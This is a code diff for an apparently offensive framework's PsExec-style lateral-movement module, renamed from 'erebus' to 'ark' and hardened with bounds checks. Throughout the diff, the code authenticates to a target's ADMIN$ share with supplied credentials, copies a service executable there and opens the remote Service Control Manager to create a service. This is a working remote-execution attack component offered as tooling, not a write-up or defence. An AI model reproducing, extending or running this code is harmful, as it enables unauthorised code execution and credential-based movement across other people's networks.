@@ -10,7 +10,7 @@
 #include <stdlib.h>
 #include <string.h>
 
-#include "erebus/lateral_impl.h"
+#include "ark/lateral_impl.h"
 
 #pragma comment(lib, "mpr.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -27,7 +27,11 @@ static int utf8_to_wide(const char *s, wchar_t **out) {
     return 1;
 }
 
-int erebus_lateral_psexec(const erebus_lateral_config *cfg, char *output, size_t output_cap, int *success) {
+static int fmt_ok(int n, size_t cap) {
+    return n >= 0 && (size_t)n < cap;
+}
+
+int ark_lateral_psexec(const ark_lateral_config *cfg, char *output, size_t output_cap, int *success) {
     *success = 0;
     output[0] = '\0';
 
@@ -49,15 +53,25 @@ int erebus_lateral_psexec(const erebus_lateral_config *cfg, char *output, size_t
         return 1;
     }
 
-    const char *svc_name = cfg->service_name[0] ? cfg->service_name : "ErebusSvc";
+    const char *svc_name = cfg->service_name[0] ? cfg->service_name : "ARKSvc";
     char remote_share[512];
-    snprintf(remote_share, sizeof(remote_share), "\\\\%s\\ADMIN$", cfg->target);
+    if (!fmt_ok(snprintf(remote_share, sizeof(remote_share), "\\\\%s\\ADMIN$", cfg->target), sizeof(remote_share))) {
+        snprintf(output, output_cap, "psexec target path too long");
+        return 1;
+    }
 
     char userbuf[512];
-    if (cfg->domain[0])
-        snprintf(userbuf, sizeof(userbuf), "%s\\%s", cfg->domain, cfg->username);
-    else
-        snprintf(userbuf, sizeof(userbuf), "%s", cfg->username);
+    if (cfg->domain[0]) {
+        if (!fmt_ok(snprintf(userbuf, sizeof(userbuf), "%s\\%s", cfg->domain, cfg->username), sizeof(userbuf))) {
+            snprintf(output, output_cap, "psexec user principal too long");
+            return 1;
+        }
+    } else {
+        if (!fmt_ok(snprintf(userbuf, sizeof(userbuf), "%s", cfg->username), sizeof(userbuf))) {
+            snprintf(output, output_cap, "psexec username too long");
+            return 1;
+        }
+    }
 
     wchar_t *wshare = NULL, *wuser = NULL, *wpass = NULL;
     if (!utf8_to_wide(remote_share, &wshare) || !utf8_to_wide(userbuf, &wuser)
@@ -81,7 +95,12 @@ int erebus_lateral_psexec(const erebus_lateral_config *cfg, char *output, size_t
     }
 
     char remote_file[768];
-    snprintf(remote_file, sizeof(remote_file), "\\\\%s\\ADMIN$\\%s.exe", cfg->target, svc_name);
+    if (!fmt_ok(snprintf(remote_file, sizeof(remote_file), "\\\\%s\\ADMIN$\\%s.exe", cfg->target, svc_name), sizeof(remote_file))) {
+        snprintf(output, output_cap, "psexec remote file path too long");
+        WNetCancelConnection2W(wshare, 0, TRUE);
+        free(wshare); free(wuser); free(wpass);
+        return 1;
+    }
 
     HANDLE hf = CreateFileA(remote_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
         FILE_ATTRIBUTE_NORMAL, NULL);
@@ -104,17 +123,43 @@ int erebus_lateral_psexec(const erebus_lateral_config *cfg, char *output, size_t
     }
 
     char bin_path[512];
-    snprintf(bin_path, sizeof(bin_path), "C:\\Windows\\%s.exe", svc_name);
+    if (!fmt_ok(snprintf(bin_path, sizeof(bin_path), "C:\\Windows\\%s.exe", svc_name), sizeof(bin_path))) {
+        snprintf(output, output_cap, "psexec service binary path too long");
+        DeleteFileA(remote_file);
+        WNetCancelConnection2W(wshare, 0, TRUE);
+        free(wshare); free(wuser); free(wpass);
+        return 1;
+    }
 
     wchar_t *wtarget = NULL, *wsvc = NULL, *wbin = NULL;
-    utf8_to_wide(cfg->target, &wtarget);
-    utf8_to_wide(svc_name, &wsvc);
-    utf8_to_wide(bin_path, &wbin);
+    if (!utf8_to_wide(cfg->target, &wtarget) || !utf8_to_wide(svc_name, &wsvc)
+        || !utf8_to_wide(bin_path, &wbin)) {
+        snprintf(output, output_cap, "utf16 convert failed");
+        DeleteFileA(remote_file);
+        WNetCancelConnection2W(wshare, 0, TRUE);
+        free(wshare); free(wuser); free(wpass);
+        free(wtarget); free(wsvc); free(wbin);
+        return 1;
+    }
 
     char scm_path[512];
-    snprintf(scm_path, sizeof(scm_path), "\\\\%s", cfg->target);
+    if (!fmt_ok(snprintf(scm_path, sizeof(scm_path), "\\\\%s", cfg->target), sizeof(scm_path))) {
+        snprintf(output, output_cap, "psexec SCM target path too long");
+        DeleteFileA(remote_file);
+        WNetCancelConnection2W(wshare, 0, TRUE);
+        free(wshare); free(wuser); free(wpass);
+        free(wtarget); free(wsvc); free(wbin);
+        return 1;
+    }
     wchar_t *wscm = NULL;
-    utf8_to_wide(scm_path, &wscm);
+    if (!utf8_to_wide(scm_path, &wscm)) {
+        snprintf(output, output_cap, "utf16 convert failed");
+        DeleteFileA(remote_file);
+        WNetCancelConnection2W(wshare, 0, TRUE);
+        free(wshare); free(wuser); free(wpass);
+        free(wtarget); free(wsvc); free(wbin);
+        return 1;
+    }
 
     SC_HANDLE hscm = OpenSCManagerW(wscm, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
     if (!hscm) {
